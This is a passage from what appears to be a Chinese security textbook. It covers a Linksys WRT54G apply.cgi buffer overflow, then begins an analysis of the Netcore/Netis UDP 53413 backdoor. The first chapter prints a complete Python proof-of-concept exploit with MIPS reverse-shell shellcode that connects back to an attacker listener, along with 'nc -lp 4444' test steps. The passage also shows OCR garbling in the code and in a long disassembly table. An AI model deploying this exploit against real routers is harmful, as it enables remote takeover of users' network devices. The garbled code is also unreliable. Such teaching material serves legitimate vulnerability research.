现在我们已经弄清楚了漏洞的原理。该漏洞在接收超过 10 000 字节的来自攻击者伪造的数据包时，由于在 do_apply_post 函数调用前后没有验证 POST 数据的长度，而在 do_apply_post 函数中使用了自定义的 wfread() 函数，并调用了 fread() 系统函数，直接将伪造的超长 POST 数据全部复制到大小为 10 000 字节的全局变量 post_buf 中，所以导致了缓冲区溢出。

## 13.3 漏洞利用

下面介绍一下该漏洞的利用方式。

#### 13.3.1 漏洞利用方式：执行Shellcode

在漏洞分析中我们发现，该漏洞有一个特征，就是缓冲区溢出的数据覆盖 .data 段中的全局变量。仔细分析能够发现在 .data 段后面有以下段，如图 13-11 所示。

因为这些段是连续的并且可写入，所以我们考虑通过 do_apply_post 函数的漏洞使溢出数据连续覆盖。data 后面的多个段，直到将 .extern 段中的 strlen 函数地址覆盖，这样，我们就可以在 wfread 函数覆盖内存以后，在调用 strlen 函数时将执行流程劫持并执行任意地址的代码，如图 13-12 所示。

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>Name</td><td style='text-align: center; word-wrap: break-word;'>Start</td><td style='text-align: center; word-wrap: break-word;'>End</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>.init</td><td style='text-align: center; word-wrap: break-word;'>00403DE0</td><td style='text-align: center; word-wrap: break-word;'>00403E5C</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>.text</td><td style='text-align: center; word-wrap: break-word;'>00403E60</td><td style='text-align: center; word-wrap: break-word;'>00442B00</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>.fini</td><td style='text-align: center; word-wrap: break-word;'>00442B00</td><td style='text-align: center; word-wrap: break-word;'>00442B58</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>.rodata</td><td style='text-align: center; word-wrap: break-word;'>00442B60</td><td style='text-align: center; word-wrap: break-word;'>0044C5B0</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>data</td><td style='text-align: center; word-wrap: break-word;'>10000000</td><td style='text-align: center; word-wrap: break-word;'>100054B0</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>.rld_map</td><td style='text-align: center; word-wrap: break-word;'>100054B0</td><td style='text-align: center; word-wrap: break-word;'>100054B4</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>.eh_frame</td><td style='text-align: center; word-wrap: break-word;'>100054B4</td><td style='text-align: center; word-wrap: break-word;'>100054B8</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>.ctors</td><td style='text-align: center; word-wrap: break-word;'>100054B8</td><td style='text-align: center; word-wrap: break-word;'>100054C0</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>.dtors</td><td style='text-align: center; word-wrap: break-word;'>100054C0</td><td style='text-align: center; word-wrap: break-word;'>100054C8</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>.jcr</td><td style='text-align: center; word-wrap: break-word;'>100054C8</td><td style='text-align: center; word-wrap: break-word;'>100054CC</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>.got</td><td style='text-align: center; word-wrap: break-word;'>100054D0</td><td style='text-align: center; word-wrap: break-word;'>10005B98</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>.sbss</td><td style='text-align: center; word-wrap: break-word;'>10005B98</td><td style='text-align: center; word-wrap: break-word;'>10005BCO</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>.bss</td><td style='text-align: center; word-wrap: break-word;'>10005BCO</td><td style='text-align: center; word-wrap: break-word;'>1000D0A0</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>.abs</td><td style='text-align: center; word-wrap: break-word;'>1000D0A0</td><td style='text-align: center; word-wrap: break-word;'>1000D0BC</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>extern</td><td style='text-align: center; word-wrap: break-word;'>1000D778</td><td style='text-align: center; word-wrap: break-word;'>1000D9E0</td></tr></table>

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>X</td><td style='text-align: center; word-wrap: break-word;'>IDAViewA</td><td style='text-align: center; word-wrap: break-word;'>X</td><td style='text-align: center; word-wrap: break-word;'>Structures</td><td style='text-align: center; word-wrap: break-word;'>X</td><td style='text-align: center; word-wrap: break-word;'>En</td><td style='text-align: center; word-wrap: break-word;'>Enums</td><td style='text-align: center; word-wrap: break-word;'>X</td><td style='text-align: center; word-wrap: break-word;'>Imports</td><td style='text-align: center; word-wrap: break-word;'>X</td><td style='text-align: center; word-wrap: break-word;'>Exports</td><td style='text-align: center; word-wrap: break-word;'>X</td><td style='text-align: center; word-wrap: break-word;'>Code</td><td style='text-align: center; word-wrap: break-word;'>XREF: sub_404A60+F4tp</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>extern:1000D7A0</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>extern</td><td style='text-align: center; word-wrap: break-word;'>strlen</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>#</td><td style='text-align: center; word-wrap: break-word;'>init_cgi+50tp ...</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>extern:1000D7A0</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>extern</td><td style='text-align: center; word-wrap: break-word;'>daemon</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>#</td><td style='text-align: center; word-wrap: break-word;'>CODE XREF: main+554tp</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>extern:1000D7A4</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>extern</td><td style='text-align: center; word-wrap: break-word;'>strspn</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>#</td><td style='text-align: center; word-wrap: break-word;'>DATA XREF: main+54Cto ...</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>extern:1000D7A8</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>extern</td><td style='text-align: center; word-wrap: break-word;'>gmtime</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>#</td><td style='text-align: center; word-wrap: break-word;'>CODE XREF: sub_406918+428tp</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>extern:1000D7A8</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>extern</td><td style='text-align: center; word-wrap: break-word;'>ct_syslog</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>#</td><td style='text-align: center; word-wrap: break-word;'>CODE XREF: sub_40584C+C0tp</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>extern:1000D7B0</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>extern</td><td style='text-align: center; word-wrap: break-word;'>tileno</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>#</td><td style='text-align: center; word-wrap: break-word;'>sub_40784C+70tp ...</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>extern:1000D7B4</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>extern</td><td style='text-align: center; word-wrap: break-word;'>klogctl</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>#</td><td style='text-align: center; word-wrap: break-word;'>CODE XREF: sub_406918+A24tp</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>extern:1000D7B4</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>extern</td><td style='text-align: center; word-wrap: break-word;'>buf_to_file</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>#</td><td style='text-align: center; word-wrap: break-word;'>CODE XREF: ej_dumplog+19Ctp</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>extern:1000D7B0</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>extern</td><td style='text-align: center; word-wrap: break-word;'>waitfor</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>#</td><td style='text-align: center; word-wrap: break-word;'>CODE XREF: sys_upgrade+1690tp</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>extern:1000D7C4</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>extern</td><td style='text-align: center; word-wrap: break-word;'>exit</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>#</td><td style='text-align: center; word-wrap: break-word;'>DATA XREF: sys_upgrade+1688tp</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>extern:1000D7C8</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>extern</td><td style='text-align: center; word-wrap: break-word;'>exit</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>#</td><td style='text-align: center; word-wrap: break-word;'>CODE XREF: sub_40784C+8Ctp</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>extern:1000D7C8</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>extern</td><td style='text-align: center; word-wrap: break-word;'>1000D7C8</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>#</td><td style='text-align: center; word-wrap: break-word;'>main+534tp</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>extern:1000D7C8</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>extern</td><td style='text-align: center; word-wrap: break-word;'>1000D7C8</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>#</td><td style='text-align: center; word-wrap: break-word;'>DATA XREF: ...</td></tr></table>

 </div>

在这里，只要填充 0x2F32（0x1000D7A0 - 0x10001AD8）字节的数据，就可以将原来的 strlen 调用位置填充为任意地址，并控制执行流程。但是，为了利用的稳定性和通用性，这里选择将 strlen 之后的一段数据一并覆盖，利用方法如图 13-13 所示。

在 post_buf 中填充 NOP 指令及 Shellcode，将 post_buf 之后总共 0x4000 字节的数据全部覆盖为 post_buf 首地址，使布置的缓冲区总是能够覆盖 strlen 函数地址，strlen 指向 post_buf，如此一来，原来执行 strlen 的地方都会跳转到 post_buf 首地址去执行。这样就可以保证 wfread() 函数布置完缓冲区以后，在 0x004112D8 处执行 strlen 函数时会被劫持到 post_buf 头部去执行我们的 Shellcode 了。

 </div>

#### 13.3.2 生成POC

在完成了 ROP 的构造以后，编写如下代码与路由器进行交互，实现漏洞利用。

1 import sys
2 import struct, socket
3 import urlib12
4 def makepayload(host, port):
5     print '[*] prepare shellcode',
6     hosts = struct.unpack('<cccc', struct.pack('<L', host))
7     ports = struct.unpack('<cccc', struct.pack('<L', port))
8     mipselshell ="\xfa\xff\x0f\x24"  # li t7,-6
9     mipselshell+="\x27\x78\xe0\x01"  # nor t7,t7,zero
10     mipselshell+="\xfd\xff\xe4\x21"  # addi a0,t7,-3
11     mipselshell+="\xfd\xff\xe5\x21"  # addi a1,t7,-3
12     mipselshell+="\xff\xff\x06\x28"  # slti a2,zero,-1
13     mipselshell+="\x57\x10\x02\x24"  # li v0,4183  # sys_socket
14     mipselshell+="\x0c\x01\x01\x01"  # syscall 0x40404
15     mipselshell+="\xff\xff\xa2\xaf"  # sw v0,-1(sp)
16     mipselshell+="\xff\xff\xa4\x8f"  # lw a0,-1(sp)

17 mipselshell+="\xfd\xff\x0f\x34" # li t7,0xfffd
18 mipselshell+="\x27\x78\xe0\x01" # nor t7,t7,zero
19 mipselshell+="\xe2\xff\xaf\xaf" # sw t7,-30(sp)
20 mipselshell+=struct.pack('<2c',ports[1],ports[0]) + "\x0e\x3c" #
17 lui t6,0x1f90
21 mipselshell+=struct.pack('<2c',ports[1],ports[0]) + "\xce\x35" #
21 ori t6,t6,0x1f90
22 mipselshell+="\xe4\xff\xae\xaf" # sw t6,-28(sp)
23 mipselshell+=struct.pack('<2c',hosts[1],hosts[0]) + "\x0e\x3c" #
24 mipselshell+=struct.pack('<2c',hosts[3],hosts[2]) + "\xce\x35" #
25 ori t6,t6,0x101
26 mipselshell+="\xe6\xff\xae\xaf" # sw t6,-26(sp)
27 mipselshell+="\xe2\xff\xa5\x27" # addiu a1,sp,-30
28 mipselshell+="\xef\xff\x0c\x24" # li t4,-17
29 mipselshell+="\x27\x30\x80\x01" # nor a2,t4,zero
30 mipselshell+="\x4a\x10\x02\x24" # li v0,4170 # sys_connect
31 mipselshell+="\x0c\x01\x01\x01" # syscall 0x40404
32 mipselshell+="\xfd\xff\x11\x24" # li s1,-3
33 mipselshell+="\x27\x88\x20\x02" # nor s1,s1,zero
34 mipselshell+="\xff\xff\xa4\x8f" # lw a0,-1(sp)
35 mipselshell+="\x21\x28\x20\x02" # move a1,s1 # dup2_loop
36 mipselshell+="\xdf\x0f\x02\x24" # li v0,4063 # sys_dup2
37 mipselshell+="\x0c\x01\x01\x01" # syscall 0x40404
38 mipselshell+="\xff\xff\x10\x24" # li s0,-1
39 mipselshell+="\xff\xff\x31\x22" # addi s1,s1,-1
40 mipselshell+="\xfa\xff\x30\x16" # bne s1,s0,68 <dup2_loop>
41 mipselshell+="\xff\xff\x06\x28" # slti a2,zero,-1
42 mipselshell+="\x62\x69\x0f\x3c" # lui t7,0x2f2f "bi"
43 mipselshell+="\x2f\x2f\xef\x35" # ori t7,t7,0x6269 "//"
44 mipselshell+="\xec\xff\xaf\xaf" # sw t7,-20(sp)
45 mipselshell+="\x73\x68\x0e\x3c" # lui t6,0x6e2f "sh"
46 mipselshell+="\x6e\x2f\xce\x35" # ori t6,t6,0x7368 "n/"
47 mipselshell+="\xf0\xff\xae\xaf" # sw t6,-16(sp)
48 mipselshell+="\xf4\xff\xa0\xaf" # sw zero,-12(sp)
49 mipselshell+="\xec\xff\xa4\x27" # addiu a0,sp,-20
50 mipselshell+="\xf8\xff\xa4\xaf" # sw a0,-8(sp)
51 mipselshell+="\xfc\xff\xa0\xaf" # sw zero,-4(sp)
52 mipselshell+="\xf8\xff\xa5\x27" # addiu a1,sp,-8
53 mipselshell+="\xab\x0f\x02\x24" # li v0,4011 # sys_execve
54 print 'ending ...'
55 return mipselshell

try:
    target = sys.argv[1]
except:
    print "Usage: %s <target>" % sys.argv[0]
    sys.exit(1)

url = "http://%s/apply.cgi" % target
#ip='192.168.230.136'
sip='192.168.1.100'  #reverse_tcp local_ip
sport = 4444  #reverse_tcp local_port
DataSegSize = 0x4000
host=socket.ntohl(struct.unpack('<I',socket.inet_aton(sip))[0])
payload = makepayload(host,sport)
addr = struct.pack("<L",0x10001AD8)
DataSegSize = 0x4000
buf = "\x00"(10000-len(payload))+payload+addr*(DataSegSize/4)
req = urllib2.Request(url, buf)
print urllib2.urlopen(req).read()

第 61 行：访问存在漏洞的 apply.cgi。

第 67 行：使用 makepayload() 函数配置 reverse_tcp 的源 IP 地址和源 PORT（端口）。

第 70 行：构造缓冲区。

第 71 行～第 72 行：使用 HTTP 协议发送伪造数据包。

## 13.4 漏洞测试

##### 测试环境

将 Linksys WRT54G 路由器与攻击机连接（有线或无线连接均可）。

##### 测试流程

01 打开网页，访问网关（路由器）。网关是 192.168.1.1，浏览器访问 192.168.1.1，登录 WRT54G 路由器，在首页上可以看到当前路由器的型号和固件版本。

02 使用 nc 命令在 192.168.1.100 上打开 4444 端口监听，命令为 “nc -lp 4444”。

03 执行测试脚本，命令为 “wrt54g_POC.py 192.168.1.1”。

04 执行任意命令。

整个过程如图 13-14 所示。

 </div>

登录路由器以后，就可以使用命令对路由器进行控制，并查看路由器 CPU 的信息了。

### 第 14 章 磊科全系列路由器后门漏洞分析

本章实验测试环境说明如表 14-1 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>测试环境</td><td style='text-align: center; word-wrap: break-word;'>备注</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>操作系统</td><td style='text-align: center; word-wrap: break-word;'>Ubuntu 12.04</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>文件系统提取工具</td><td style='text-align: center; word-wrap: break-word;'>Binwalk 2.0</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>调试器</td><td style='text-align: center; word-wrap: break-word;'>IDA 6.1</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>利用代码解释器</td><td style='text-align: center; word-wrap: break-word;'>Python 2.7</td><td style='text-align: center; word-wrap: break-word;'></td></tr></table>

## 14.1 漏洞介绍

磊科公司专注于以 IP 技术为核心的数据通信网络产品的研发，其产品覆盖路由、交换、DSL、Wi-Fi。磊科公司的路由器产品在中国的品牌名为 netcore，在国外的品牌名为 netis。2014 年国外研究人员发现，netcore 系列路由器中存在一个后门漏洞，进入该后门的口令被“硬编码”（密码是一个固定值）写入设备的固件中，而且所有的口令似乎都一样。攻击者可以轻易地利用这个口令登录路由器，而且用户无法更改或禁用这个后门。

我们可以从 http://blog.trendmicro.com/trendlabs-security-intelligence/netis-routers-leave-wide-open-backdoor/ 中了解造成该后门漏洞的原因：磊科路由器内置了一个叫做 “IGDMPTD” 的程序，该程序会随路由器启动，并在公网上开放了 UDP 协议的 53413 端口，使攻击者可以通过公网在磊科路由器上执行任意系统命令，上传和下载文件，进而控制路由器，其影响范围及危险等级都是极高的。

由于该漏洞影响磊科全系列路由器，所以在本章中使用如表 14-2 所示的硬件和软件分析环境进行分析。

固件版本信息如图 14-1 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>描述</td><td style='text-align: center; word-wrap: break-word;'>备注</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>型号</td><td style='text-align: center; word-wrap: break-word;'>NW774</td><td style='text-align: center; word-wrap: break-word;'>netcore</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>固件版本</td><td style='text-align: center; word-wrap: break-word;'>V1.1.26171</td><td style='text-align: center; word-wrap: break-word;'>2014-11-7</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>指令系统</td><td style='text-align: center; word-wrap: break-word;'>MIPS</td><td style='text-align: center; word-wrap: break-word;'>大端机格式</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>QEMU</td><td style='text-align: center; word-wrap: break-word;'>1.7.90</td><td style='text-align: center; word-wrap: break-word;'>处理器模拟软件</td></tr></table>

 </div>

## 14.2 漏洞分析

下面我们对该漏洞进行详细分析。

#### 14.2.1 固件分析

下载磊科路由器 1.1.26171 版本的固件，链接为 http://www.netcoretec.com/downloadsfront.do?method=picker&flag=all&id=aa7bb843-37ba-482c-99a3-096c7be76c13&fileId=273&v=0.zip，解压缩后得到固件 “NW774 升级固件.bin”，将其更名为 “NW774.bin”。

使用 Binwalk 将固件中的文件系统提取出来，提取命令如图 14-2 所示。

后门的核心组件为 /bin/igdmptd，如图 14-3 所示。

 </div>

 </div>

#### 14.2.2 漏洞成因分析

查看路由器目录下的 /etc/service 文件，查找在该路由器中每个端口所对应的程序。

从该文件中可以看到，磊科路由器的后门漏洞 IGDMTPTD 守护进程在 UDP 端口 53413 监听网络数据。使用 IDA 打开 IGDMTPTD，如图 14-4 所示。

在 0x00402EEC 处的 create_socket 函数中（后文遇到的函数名称，如 “create_socket”，都是根据函数功能自定义的名称）创建 Socket 会话。进入 create_socket 函数以后，程序会在 0x00402C64 处调用 getBr0IP 函数，如图 14-5 所示。

getBr0IP 函数的目的是通过 ioctl 函数获取名为 “br0” 的网卡的 IP 地址，然后在该网卡上开启监听。

在 getBr0IP 函数中使用 Socket 函数创建 UDP 协议的 Socket 会话，如图 14-6 所示。

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>00402ECC</td><td style='text-align: center; word-wrap: break-word;'>loc_402ECC:</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402ECC</td><td style='text-align: center; word-wrap: break-word;'>la</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402ED0</td><td style='text-align: center; word-wrap: break-word;'>la</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402ED8</td><td style='text-align: center; word-wrap: break-word;'>11</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402EDC</td><td style='text-align: center; word-wrap: break-word;'>1w</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402EE0</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402EE4</td><td style='text-align: center; word-wrap: break-word;'>jalr</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402EE8</td><td style='text-align: center; word-wrap: break-word;'>1i</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402EEC</td><td style='text-align: center; word-wrap: break-word;'>jal</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402EF0</td><td style='text-align: center; word-wrap: break-word;'>nop</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402EF4</td><td style='text-align: center; word-wrap: break-word;'>1w</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402EF8</td><td style='text-align: center; word-wrap: break-word;'>move</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402EFC</td><td style='text-align: center; word-wrap: break-word;'>1w</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F00</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F08</td><td style='text-align: center; word-wrap: break-word;'>1u1</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F0C</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F10</td><td style='text-align: center; word-wrap: break-word;'>jalr</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F14</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F1C</td><td style='text-align: center; word-wrap: break-word;'>move</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F20</td><td style='text-align: center; word-wrap: break-word;'>1w</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F24</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F21</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F22</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F23</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F24</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F25</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F26</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F27</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F28</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F29</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F30</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F31</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F32</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F33</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F34</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F35</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F36</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F37</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F38</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F39</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F40</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F41</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F42</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F43</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F44</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F45</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td 